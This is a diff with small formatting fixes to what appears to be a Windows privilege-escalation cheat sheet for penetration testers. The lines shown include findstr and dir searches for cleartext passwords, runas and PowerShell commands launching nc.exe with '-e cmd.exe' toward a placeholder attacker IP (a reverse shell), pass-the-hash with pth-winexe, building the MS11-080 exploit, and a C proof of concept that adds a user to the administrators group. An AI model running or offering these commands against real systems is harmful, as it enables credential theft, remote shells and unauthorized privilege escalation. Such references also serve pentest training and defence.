@@ -133,7 +133,7 @@ EoP 3: ClearText passwords (quick hits)
 findstr /si password *.xml
 findstr /si password *.ini*
     Find all those strings in config files.
-    *$dir /s *pass* == *cred* == *vnc* == *.config**
+    *$ dir /s *pass* == *cred* == *vnc* == *.config**
 
     Find all passwords in all files.
     *$ findstr /spin "password" *.**
@@ -183,9 +183,9 @@ $ pth-winexe -U user%  //$ip cmd*
     Technique 1:
     *C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"*
     Technique 2:
-    *$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
-$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
-$computer = "<hostname>"
+    *$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$ computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)*
     *$ powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1*
     Technique 3:
@@ -491,7 +491,7 @@ Useful exploits
 
 Windows MS11-080
     http://www.exploit-db.com/exploits/18176/
-    *$python pyinstaller.py --onefile ms11-080.py*
+    *$ python pyinstaller.py --onefile ms11-080.py*
     *$ mx11-080.exe -O XP*
 
 From admin to system
@@ -519,9 +519,9 @@ PoCs
     *#include <stdlib.h>
 int main ()
 {
-int i;
+    int i;
     i = system("net localgroup administrators theusername /add");
-return 0;
+    return 0;
 }*
     *i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe*
 
